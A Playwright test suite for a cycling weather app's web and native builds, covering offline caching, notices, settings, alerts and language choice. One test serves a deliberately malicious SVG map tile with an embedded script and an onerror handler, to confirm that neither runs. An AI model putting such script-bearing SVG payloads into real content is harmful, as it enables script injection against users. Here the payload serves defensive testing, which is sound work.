  const { navHeight, tallestButton, count } = await page.evaluate(() => {
    const nav = document.querySelector('header nav');
    const buttons = [...nav.querySelectorAll('button')].filter((b) => b.offsetParent !== null);
    return {
      navHeight: nav.getBoundingClientRect().height,
      tallestButton: Math.max(...buttons.map((b) => b.getBoundingClientRect().height)),
      count: buttons.length,
    };
  });

  expect(count, 'expected the app toolbar to carry both extra buttons').toBeGreaterThan(4);
  expect(navHeight, `toolbar is ${navHeight}px tall for a ${tallestButton}px button, so it wrapped`)
    .toBeLessThan(tallestButton * 1.5);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
});

test('an empty table says why', async ({ page }) => {
  const control = { celsius: 21, offline: false };
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);

  // The provider is unreachable and nothing is cached, which used to render an
  // empty table with no explanation at all.
  control.offline = true;
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(page.locator('.notice')).toContainText(/not responding|no responde/);
  expect(await shownTemperatures(page)).toEqual([]);
});

test('a provider that recovers through the chain says nothing', async ({ page }) => {
  // First call fails, the rest succeed: that is a working run, not an error.
  let calls = 0;
  await page.route(
    (url) => url.hostname === 'api.open-meteo.com',
    (route) => {
      calls += 1;
      return calls === 1
        ? route.abort()
        : route.fulfill({
            status: 200,
            contentType: 'application/json',
            body: JSON.stringify(forecastAt(21)),
          });
    }
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await page.waitForTimeout(2000);   // past the window the warning would fire in
  await expect(page.locator('.notice')).not.toContainText(/not responding|no responde/);
});

test('a rejected API key is named as such', async ({ page }) => {
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) =>
    route.fulfill({ status: 401, contentType: 'application/json', body: '{"error":true}' })
  );
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(page.locator('.notice')).toContainText(/API key/);
});

// Each computation hands fetch its own recorder, and the wrapper in utils.js notes the
// provider answers there and nowhere else. A request without one is not watched.
test('a provider request carrying a recorder notes its outcome there', async ({ page }) => {
  await page.route((url) => url.hostname === 'api.open-meteo.com', (route) => {
    const kind = new URL(route.request().url()).searchParams.get('case');
    if (kind === 'down') return route.abort();
    return route.fulfill({ status: kind === 'key' ? 401 : 200, contentType: 'application/json', body: '{}' });
  });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (r) => r.abort());
  await page.goto('/index.html');
  await mapReady(page);
  const recorded = await page.evaluate(async () => {
    const rec = window.cw.utils.createRecorder();
    const base = 'https://api.open-meteo.com/v1/forecast?case=';
    await fetch(base + 'ok', { cwRecorder: rec });
    await fetch(base + 'down', { cwRecorder: rec }).catch(() => {});
    await fetch(base + 'key', { cwRecorder: rec });
    await fetch(base + 'key');   // no recorder: noted nowhere
    return rec;
  });
  expect(recorded).toEqual({ ok: 1, failed: 2, lastFailStatus: '401', staleAgeMs: 0 });
});

test('a stale cache read without connection notes its age in the recorder', async ({ page }) => {
  await goOffline(page);
  await page.addInitScript(() => Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true }));
  await page.goto('/index.html');
  await mapReady(page);
  const read = await page.evaluate(() => {
    localStorage.setItem('cw_weather_probe', JSON.stringify({ data: { probe: 1 }, timestamp: Date.now() - 100 * 60000 }));
    const rec = window.cw.utils.createRecorder();
    return { data: window.cw.utils.getCache('cw_weather_probe', rec), age: rec.staleAgeMs };
  });
  expect(read.data).toEqual({ probe: 1 });
  expect(read.age).toBeGreaterThanOrEqual(100 * 60000);
  expect(read.age).toBeLessThan(101 * 60000);
});

test('the app reopens on the last route, with no network', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(routeName(page)).toContainText('Masnou');
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);

  // Out of coverage, cold start, nobody touches the file picker.
  await ageTheCache(page, 90);
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
  await expect(page.locator('.notice')).toContainText('1 h 30 min');
});

test('a first run without coverage says so', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );

  // Nothing stored and nothing reachable: the screen would otherwise stay blank.
  await page.goto('/index.html');
  await mapReady(page);

  await expect(page.locator('.notice')).toContainText(/needs coverage|necesita cobertura/, {
    timeout: 15000,
  });
});

test('a first run with coverage stays quiet', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18, offline: false });

  await page.goto('/index.html');
  await mapReady(page);
  await page.waitForTimeout(7000);   // past the point the offline notice would appear

  await expect(page.locator('.notice')).not.toContainText(/needs coverage|necesita cobertura/);
});

test('the blank map says why, and only when it is blank', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18, offline: false });

  // With a connection the tiles load, so there is nothing to explain.
  await page.goto('/index.html');
  await mapReady(page);
  await expect(page.locator('#cwMapOffline')).toBeHidden();

  // Out of coverage the background cannot load and a bare grey rectangle reads as
  // a failure. It must be labelled, and without covering the route.
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);

  const badge = page.locator('#cwMapOffline');
  await expect(badge).toBeVisible();

  const { badgeBox, mapBox } = await page.evaluate(() => ({
    badgeBox: document.getElementById('cwMapOffline').getBoundingClientRect().toJSON(),
    mapBox: document.getElementById('map').getBoundingClientRect().toJSON(),
  }));
  // Out of the middle of the map, where the track is drawn.
  expect(badgeBox.top).toBeGreaterThan(mapBox.top + mapBox.height * 0.6);
});

/** Tiles a server would send, with the cross-origin header the cache depends on. */
async function stubTiles(page, control) {
  await page.route(
    (url) => url.hostname.endsWith('tile.openstreetmap.org'),
    (route) =>
      control.offline
        ? route.abort()
        : route.fulfill({
            status: 200,
            contentType: 'image/svg+xml',
            headers: { 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'public, max-age=604800' },
            body: '<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256"><rect width="256" height="256" fill="#e8e0d8"/></svg>',
          })
  );
}

const tilesDrawn = (page) => page.locator('#map img.leaflet-tile-loaded');

test('map tiles already seen survive losing coverage', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);
  await stubTiles(page, control);

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(tilesDrawn(page)).not.toHaveCount(0);
  await expect
    .poll(async () => (await page.evaluate(() => window.cwTileCacheStats())).tiles)
    .toBeGreaterThan(0);

  // Out of coverage, cold start: the route restores and the background comes back
  // from what was stored, so the map is not a blank rectangle.
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);
  await expect(routeName(page)).toContainText('Masnou');
  await expect(tilesDrawn(page)).not.toHaveCount(0);

  // And with a background there is nothing to apologise for.
  await expect(page.locator('#cwMapOffline')).toBeHidden();
});

test('the website keeps the plain tile layer', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  // No Capacitor, so no caching layer: the map behaves exactly as it always did.
  expect(await page.evaluate(() => !!(window.cwTileLayer && window.cwTileLayer.createTile
    && window.cwTileLayer.createTile !== window.L.TileLayer.prototype.createTile))).toBe(false);
});

test('the tile cache stays bounded across sessions', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);

  // Seed more tiles than the cap, as many sessions of riding would. Writing them
  // directly is the point: a session that views only a handful of tiles must still
  // end up trimming what earlier sessions left behind.
  await page.evaluate(async () => {
    const db = await new Promise((res) => {
      const r = indexedDB.open('cw_tiles', 1);
      r.onsuccess = (e) => res(e.target.result);
    });
    const store = db.transaction('tiles', 'readwrite').objectStore('tiles');
    for (let i = 0; i < 1400; i++) {
      store.put({ url: `https://x/${i}.png`, blob: new Blob(['t']), ts: 1000 + i });
    }
    await new Promise((res) => { store.transaction.oncomplete = res; });
    db.close();
  });
  expect((await page.evaluate(() => window.cwTileCacheStats())).tiles).toBe(1400);

  await page.reload();
  await mapReady(page);

  await expect
    .poll(async () => (await page.evaluate(() => window.cwTileCacheStats())).tiles, { timeout: 15000 })
    .toBeLessThanOrEqual(1000);

  // The oldest went first, so the tiles most recently looked at are the survivors.
  const survivors = await page.evaluate(async () => {
    const db = await new Promise((res) => {
      const r = indexedDB.open('cw_tiles', 1);
      r.onsuccess = (e) => res(e.target.result);
    });
    return new Promise((res) => {
      const q = db.transaction('tiles', 'readonly').objectStore('tiles').getAll();
      q.onsuccess = () => res(q.result.map((r) => r.ts));
    });
  });
  expect(Math.min(...survivors)).toBeGreaterThan(1000);
});

// Private browsing, blocked site data, a full disk. Caching is then impossible and
// the app must behave as it always did. Deliberately says nothing about the badge:
// whether the background survives depends on the web view's own HTTP cache, which
// was observed doing it sometimes and not others, and that is not ours to assert.
test('the map still works when storage is unavailable', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await installNativeBridge(page);
  await stubProvider(page, control);
  await stubTiles(page, control);

  // Private browsing, blocked site data, a full disk: opening the database throws.
  // Caching is then impossible, but the map must behave exactly as it always did.
  await page.addInitScript(() => {
    window.indexedDB = {
      open() { throw new Error('IndexedDB is disabled'); },
    };
  });

  const crashes = [];
  page.on('pageerror', (e) => crashes.push(e.message));

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(tilesDrawn(page)).not.toHaveCount(0);
  await expect(routeName(page)).toContainText('Masnou');

  // The dangerous combination: no network either, so every tile has to go through
  // the cache lookup that cannot work. Tiles must settle as errors rather than hang
  // forever waiting on a promise nobody resolves.
  control.offline = true;
  await page.addInitScript(() =>
    Object.defineProperty(navigator, 'onLine', { get: () => false, configurable: true })
  );
  await page.reload();
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);

  await expect(routeName(page)).toContainText('Masnou');
  await expect(trackDrawn(page)).not.toHaveCount(0);
  expect(crashes).toEqual([]);
});

test('the settings panel still fits across the screen', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#toggleConfig').click();
  await page.waitForTimeout(400);

  // This used to check every keyboard field was at least 16px, the trick for stopping
  // iOS zooming in on focus. The viewport does that now (see the page-zoom test), and
  // the sizes went back to the website's. What is still worth pinning is the thing
  // raising them broke: the panel overflowing sideways.
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth)).toBe(true);
  await expect(page.locator('#apiKeyOW')).toBeVisible();
});

test('coming back later says the start time has passed', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await recordNotices(page);
  await installNativeBridge(page);
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(routeName(page)).toContainText('Masnou');

  // The phone was in a pocket for a couple of hours. The app is resumed, not
  // reloaded, so the table is still the one computed for a departure already gone.
  await page.evaluate(() => {
    const field = document.getElementById('datetimeRoute');
    const past = new Date(Date.now() - 2 * 3600 * 1000);
    past.setSeconds(0, 0);
    field.value = past.toISOString().slice(0, 16);
    window.__appListeners.appStateChange({ isActive: true });
  });

  await expect
    .poll(() => page.evaluate(() => window.__notices))
    .toEqual(expect.arrayContaining([expect.stringMatching(/start time has passed|hora de salida ya ha pasado/)]));
});

test('coming back while the departure is still ahead says nothing', async ({ page }) => {
  const control = { celsius: 18, offline: false };
  await recordNotices(page);
  await installNativeBridge(page);
  await stubProvider(page, control);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect(routeName(page)).toContainText('Masnou');

  await page.evaluate(() => window.__appListeners.appStateChange({ isActive: true }));
  await page.waitForTimeout(1500);
  const seen = await page.evaluate(() => window.__notices);
  expect(seen.join(' | ')).not.toMatch(/start time has passed|hora de salida ya ha pasado/);
});

test('a booby-trapped map tile cannot run script', async ({ page }) => {
  // Tiles are the one new path from the network into the DOM: fetched, stored, and
  // rendered through an object URL. An <img> does not execute script in an SVG, and
  // this pins that down for the cached path as well as the live one.
  const evil = `<svg xmlns="http://www.w3.org/2000/svg" width="256" height="256">
    <rect width="256" height="256" fill="#e8e0d8"/>
    <script type="text/javascript">window.top.__tilePwned = 1;<\/script>
    <image href="x" onerror="window.top.__tilePwned = 2"/>
  </svg>`;

  await installNativeBridge(page);
  await stubProvider(page, { celsius: 18, offline: true });
  await page.route((url) => url.hostname.endsWith('tile.openstreetmap.org'), (route) =>
    route.fulfill({
      status: 200,
      contentType: 'image/svg+xml',
      headers: { 'Access-Control-Allow-Origin': '*' },
      body: evil,
    })
  );

  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect
    .poll(async () => (await page.evaluate(() => window.cwTileCacheStats())).tiles)
    .toBeGreaterThan(0);
  expect(await page.evaluate(() => window.__tilePwned)).toBeUndefined();

  // Again once it comes back from storage rather than the network.
  await page.reload();
  await mapReady(page);
  await page.waitForTimeout(1500);
  expect(await page.evaluate(() => window.__tilePwned)).toBeUndefined();
});

test('settings survive the web view losing its storage', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);

  await page.goto('/index.html');
  await mapReady(page);

  // Change something the user would notice losing, and save it the way the app does.
  await page.evaluate(() => {
    document.getElementById('windUnits').value = 'mph';
    document.getElementById('apiKeyOW').value = 'KEY-TO-KEEP';
    window.saveSettings();
  });
  await expect
    .poll(() => page.evaluate(() => window.__prefsRead().cwSettings))
    .toBeTruthy();

  // iOS reclaims WebKit storage: localStorage is gone, native storage is not.
  await page.evaluate(() => localStorage.clear());
  await page.reload();
  await mapReady(page);

  await expect.poll(() => page.evaluate(() => document.getElementById('windUnits').value)).toBe('mph');
  expect(await page.evaluate(() => document.getElementById('apiKeyOW').value)).toBe('KEY-TO-KEEP');
});

test('the web view keeps priority while it still has the settings', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.addInitScript(() => {
    // A stale native copy from an older session must not overwrite what is in use.
    sessionStorage.setItem('__prefs', JSON.stringify({
      cwSettings: JSON.stringify({ windUnits: 'kmh', apiKeyOW: 'OLD-KEY' }),
    }));
  });

  await page.goto('/index.html');
  await mapReady(page);
  await page.evaluate(() => {
    document.getElementById('apiKeyOW').value = 'CURRENT-KEY';
    window.saveSettings();
  });
  await page.reload();
  await mapReady(page);

  await expect.poll(() => page.evaluate(() => document.getElementById('apiKeyOW').value)).toBe('CURRENT-KEY');
});

/* ---------- opening where the phone is ---------- */

const mapCentre = (page) =>
  page.evaluate(() => {
    const c = window.map.getCenter();
    return { lat: c.lat, lng: c.lng };
  });

// Madrid: far from both the website's Barcelona default and the fixture's route.
test.describe('with the phone in Madrid', () => {
  test.use({ geolocation: { latitude: 40.4168, longitude: -3.7038 }, permissions: ['geolocation'] });

  test('an empty map opens where the phone is, not on the website default', async ({ page }) => {
    await installNativeBridge(page);
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);

    await expect.poll(async () => (await mapCentre(page)).lng).toBeLessThan(-3);
    const c = await mapCentre(page);
    expect(Math.abs(c.lat - 40.4168)).toBeLessThan(0.05);
  });

  test('a route that arrived at start keeps the map; the position does not move it', async ({ page }) => {
    const gpx = await readFile(FIXTURE, 'utf8');
    await installNativeBridge(page, { routes: [{ gpx, name: 'shared.gpx' }] });
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    await expect(trackDrawn(page)).not.toHaveCount(0, { timeout: 15000 });

    // Long enough for a position to have been applied if it was going to be.
    await page.waitForTimeout(1500);
    const c = await mapCentre(page);
    expect(Math.abs(c.lat - 41.478)).toBeLessThan(0.05);
    expect(Math.abs(c.lng - 2.31)).toBeLessThan(0.05);
  });
});


/* ---------- ride alerts ---------- */

const savedWatches = (page) =>
  page.evaluate(() => window.__runnerEvents.filter((e) => e.event === 'saveWatch').map((e) => e.details.watch));

async function loadRouteAndForecast(page) {
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#gpxFile').setInputFiles(FIXTURE);
  await expect.poll(async () => (await shownTemperatures(page)).length).toBeGreaterThan(0);
}

test('computing a forecast arms the background watch with the route and a baseline', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 20, watch: { rain: 0, wind: 8, gust: 12 } });
  await loadRouteAndForecast(page);

  await expect.poll(async () => (await savedWatches(page)).length).toBeGreaterThan(0);
  const watches = await savedWatches(page);
  const watch = watches[watches.length - 1];
  expect(watch).not.toBeNull();
  expect(watch.name).toBe('route.gpx');
  expect(watch.points.length).toBeGreaterThan(1);
  expect(watch.points.length).toBeLessThanOrEqual(12);
  expect(watch.end).toBeGreaterThan(Date.now());
  expect(watch.points[0]).toEqual(expect.objectContaining({ t: expect.any(Number), label: expect.stringMatching(/^\d\d:\d\d$/) }));
  // Seeded from the same request the runner will make, not from the table.
  expect(watch.baseline).toHaveLength(watch.points.length);
  expect(watch.baseline[0]).toEqual({ rain: 0, wind: 8, gust: 12 });
  expect(watch.owKey).toBe('');
  expect(await page.evaluate(() => window.__notifAsked)).toBe(true);
  expect(await page.evaluate(() => window.__runnerEvents.every((e) => e.label === 'cc.meteoride.app.watch'))).toBe(true);
  await expect(page.locator('#rideAlertsStatus')).toContainText('route.gpx');
});

test('the toggle clears the watch, stops new ones, and re-arms when switched back on', async ({ page }) => {
  await installNativeBridge(page);
  await stubProvider(page, { celsius: 20 });
  await loadRouteAndForecast(page);
  await expect.poll(async () => (await savedWatches(page)).length).toBeGreaterThan(0);
  const armed = (await savedWatches(page)).length;

  await page.evaluate(() => {
    const el = document.getElementById('rideAlerts');
    el.checked = false;
    el.dispatchEvent(new Event('change', { bubbles: true }));
  });
  await expect.poll(async () => (await savedWatches(page)).slice(-1)[0]).toBeNull();
  await expect(page.locator('#rideAlertsStatus')).toHaveText('');
  expect(JSON.parse(await page.evaluate(() => localStorage.getItem('cwSettings'))).rideAlerts).toBe(false);

  // Another forecast while off must not arm anything.
  await page.evaluate(() => document.dispatchEvent(new CustomEvent('cw:forecast', { detail: { steps: window.weatherData } })));
  await page.waitForTimeout(500);
  const afterOff = await savedWatches(page);
  expect(afterOff.length).toBe(armed + 1);

  await page.evaluate(() => {
    const el = document.getElementById('rideAlerts');
    el.checked = true;
    el.dispatchEvent(new Event('change', { bubbles: true }));
  });
  await expect.poll(async () => (await savedWatches(page)).slice(-1)[0]).not.toBeNull();
});

test('when notifications are refused the toggle switches itself off and says so', async ({ page }) => {
  await installNativeBridge(page, { notifications: 'denied' });
  await stubProvider(page, { celsius: 20 });
  await recordNotices(page);
  await loadRouteAndForecast(page);

  await expect(page.locator('#rideAlerts')).not.toBeChecked();
  await expect.poll(() => page.evaluate(() => window.__notices.join(' | '))).toContain('Notifications are off');
  expect(JSON.parse(await page.evaluate(() => localStorage.getItem('cwSettings'))).rideAlerts).toBe(false);
  const watches = await savedWatches(page);
  expect(watches.filter((w) => w !== null)).toHaveLength(0);
});

test('a watch stored by an earlier session is shown at start-up; the toggle is app-only', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.addInitScript(() => {
    sessionStorage.setItem('__watch', JSON.stringify({
      name: 'sunday.gpx', lang: 'en', start: Date.now() + 3600000, end: Date.now() + 7200000, points: [], notified: [],
    }));
  });
  await page.goto('/index.html');
  await mapReady(page);
  // The settings panel is closed, so check the row itself rather than visibility.
  await expect.poll(() => page.evaluate(() => document.getElementById('rideAlertsRow').hidden)).toBe(false);
  await expect(page.locator('#rideAlertsStatus')).toContainText('sunday.gpx');
});

test('on the website the ride-alerts toggle is not shown, even with the panel open', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#toggleConfig').click();
  await expect(page.locator('#showWeatherAlerts')).toBeVisible();   // the panel really is open
  await page.waitForTimeout(500);
  await expect(page.locator('#rideAlertsRow')).toBeHidden();
});

test('in the app the toggle sits in the open panel', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.locator('#toggleConfig').click();
  await expect(page.locator('#rideAlerts')).toBeVisible();
  await expect(page.locator('#rideAlerts')).toBeChecked();
});

test('when the OS will not run background tasks, the toggle says so', async ({ page }) => {
  await installNativeBridge(page, { background: 'denied' });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await expect(page.locator('#rideAlertsHint')).toContainText('Background App Refresh');

  // And stays quiet when it will.
  await installNativeBridge(page, { background: 'available' });
  await page.reload();
  await mapReady(page);
  await page.waitForTimeout(500);
  expect(await page.evaluate(() => document.getElementById('rideAlertsHint').hidden)).toBe(true);
});

/* ---------- starting language ---------- */

const chosenLanguage = (page) => page.evaluate(() => document.getElementById('language').value);

test.describe('on a phone set to Spanish', () => {
  test.use({ locale: 'es-ES' });

  test('a first run opens in Spanish, not English', async ({ page }) => {
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    expect(await chosenLanguage(page)).toBe('es');
    // And the interface really is translated, not just the select.
    await expect(page.locator('[data-i18n="show_weather_alerts_label"]')).toHaveText(/alertas/i);
  });

  test('a language the user chose survives, and the device does not override it', async ({ page }) => {
    await page.addInitScript(() => {
      localStorage.setItem('cwSettings', JSON.stringify({ language: 'en', windUnits: 'kmh' }));
    });
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    expect(await chosenLanguage(page)).toBe('en');
  });
});

test.describe('on a phone set to Catalan', () => {
  test.use({ locale: 'ca-ES' });

  test('falls back to Spanish rather than English', async ({ page }) => {
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    expect(await chosenLanguage(page)).toBe('es');
  });
});

test.describe('on a phone set to German', () => {
  test.use({ locale: 'de-DE' });

  test('falls back to English, the only other language there is', async ({ page }) => {
    await goOffline(page);
    await page.goto('/index.html');
    await mapReady(page);
    expect(await chosenLanguage(page)).toBe('en');
  });
});

// initUI runs when ui.js loads and draws the recent-routes button once IndexedDB
// answers, which can be before app.js has loaded the settings: the select still holds
// the markup's English, and nothing relabelled the button afterwards. Holding app.js
// back makes that order certain instead of a matter of timing.
test('the recent-routes button speaks the saved language even when it is drawn first', async ({ page }) => {
  await page.addInitScript(() => {
    if (sessionStorage.getItem('seeded')) return;
    sessionStorage.setItem('seeded', '1');
    localStorage.setItem('cwSettings', JSON.stringify({ language: 'es', windUnits: 'kmh' }));
    localStorage.setItem('meteoride_recent_routes', JSON.stringify([{
      name: 'Montseny.gpx', timestamp: Date.now(),
      content: '<?xml version="1.0"?><gpx><trk><name>Montseny</name></trk></gpx>',
    }]));
  });
  await goOffline(page);
  let drawnFirst = false;
  await page.route((url) => url.pathname === '/scripts/app.js', async (route) => {
    await page.waitForFunction(() => !!document.getElementById('recentRoutesButton'), null, { timeout: 10000 });
    drawnFirst = true;
    await route.continue();
  });
  await page.goto('/index.html');
  await mapReady(page);
  expect(drawnFirst, 'the button was not drawn before app.js ran').toBe(true);
  expect(await chosenLanguage(page)).toBe('es');
  const button = page.locator('#recentRoutesButton');
  await expect(button).toHaveAttribute('title', '1 rutas recientes');
  await expect(button).toHaveAttribute('aria-label', '1 rutas recientes');
});

/* ---------- the file picker ---------- */

const acceptAttr = (page) => page.evaluate(() => document.getElementById('gpxFile').getAttribute('accept'));

test('in the app the picker accepts types iOS can actually map', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  // .gpx has no system UTI, so a picker limited to it greys out every file.
  await expect.poll(() => acceptAttr(page)).toContain('application/octet-stream');
  expect(await acceptAttr(page)).toContain('.gpx');
});

test('on the website the picker keeps the tight list', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  await page.waitForTimeout(300);
  expect(await acceptAttr(page)).toBe('.gpx,.kml');
});

/* ---------- defaults and vertical space ---------- */

test('a fresh install shows the speed and interval the markup declares', async ({ page }) => {
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  // loadSettings used to blank every field with nothing stored, which threw away
  // the defaults in index.html: the speed came up empty and the interval select,
  // given an invalid value, showed nothing at all.
  expect(await page.evaluate(() => document.getElementById('cyclingSpeed').value)).toBe('12');
  expect(await page.evaluate(() => document.getElementById('intervalSelect').value)).toBe('15');

  // And a stored value still wins.
  await page.evaluate(() => {
    document.getElementById('cyclingSpeed').value = '24';
    window.saveSettings();
  });
  await page.reload();
  await mapReady(page);
  expect(await page.evaluate(() => document.getElementById('cyclingSpeed').value)).toBe('24');
});

test('an empty value left behind by the old bug does not keep winning', async ({ page }) => {
  // What the earlier version wrote to real devices: it blanked the fields, then
  // saveSettings persisted the blanks, so every later load read an empty string and
  // put it back. Ignoring only null was not enough to recover from that.
  await page.addInitScript(() => {
    localStorage.setItem('cwSettings', JSON.stringify({
      cyclingSpeed: '', intervalSelect: '', windUnits: 'kmh',
    }));
  });
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  expect(await page.evaluate(() => document.getElementById('intervalSelect').value)).toBe('15');
  expect(await page.evaluate(() => document.getElementById('cyclingSpeed').value)).toBe('12');
  // The rest of the stored settings are untouched.
  expect(await page.evaluate(() => document.getElementById('windUnits').value)).toBe('kmh');
});

test('the app turns off page zoom instead of forcing 16px on some fields', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  const viewport = await page.evaluate(() => document.querySelector('meta[name="viewport"]').content);
  expect(viewport).toContain('user-scalable=no');
  expect(viewport).toContain('viewport-fit=cover');

  // The speed box and the interval select sit side by side; they must match.
  const sizes = await page.evaluate(() => [
    getComputedStyle(document.getElementById('cyclingSpeed')).fontSize,
    getComputedStyle(document.getElementById('intervalSelect')).fontSize,
  ]);
  expect(sizes[0]).toBe(sizes[1]);
});

/** How far the bottom of an element falls past the bottom of the screen, in pixels.
 *  Measured rather than read off scrollHeight, which `overflow: hidden` on the body
 *  clips to the viewport whatever the content does — an assertion that cannot fail. */
const overflowBelow = (page, selector) =>
  page.evaluate(
    (sel) => Math.round(document.querySelector(sel).getBoundingClientRect().bottom - window.innerHeight),
    selector
  );

test('the app fits the screen even with a taller header and a notice showing', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/index.html');
  await mapReady(page);
  expect(await overflowBelow(page, 'main')).toBeLessThanOrEqual(1);

  // Chromium reports no safe-area inset, so stand in for the notch. The point is
  // that main takes whatever the header leaves rather than assuming 3rem: sized by
  // that assumption, it would now hang 60px off the bottom.
  await page.addStyleTag({ content: 'html.cw-native header { padding-top: 60px !important; }' });
  await page.waitForTimeout(100);
  expect(await overflowBelow(page, 'main')).toBeLessThanOrEqual(1);

  // A notice must push the table down within main, not off the bottom: the map is
  // what gives up the space.
  await page.evaluate(() => window.setNotice('Un aviso bastante largo sobre el horizonte de la previsión', 'warn'));
  await page.waitForTimeout(100);
  await expect(page.locator('#horizonNotice')).toBeVisible();
  expect(await overflowBelow(page, 'main')).toBeLessThanOrEqual(1);
  expect(await overflowBelow(page, '.wtc-wrap')).toBeLessThanOrEqual(1);
});

/* ---------- the help page ---------- */

test('the help page describes the app-only features, but only in the app', async ({ page }) => {
  await goOffline(page);
  await page.goto('/help.html');
  await expect(page.locator('.app-only')).toBeHidden();

  await installNativeBridge(page);
  await page.reload();
  await expect(page.locator('.app-only')).toBeVisible();

  // The things that exist only in the shell, each of which a reader has to be told
  // about because no button explains itself.
  for (const text of ['📤', '📴', 'Avisarme si cambia el tiempo', 'Actualización en segundo plano']) {
    await expect(page.locator('.app-only')).toContainText(text);
  }
});

test('the English help page says the same', async ({ page }) => {
  await installNativeBridge(page);
  await goOffline(page);
  await page.goto('/help_en.html');
  await expect(page.locator('.app-only')).toBeVisible();
  for (const text of ['📤', '📴', 'Tell me if the weather on the route changes', 'Background App Refresh']) {
    await expect(page.locator('.app-only')).toContainText(text);
  }
});
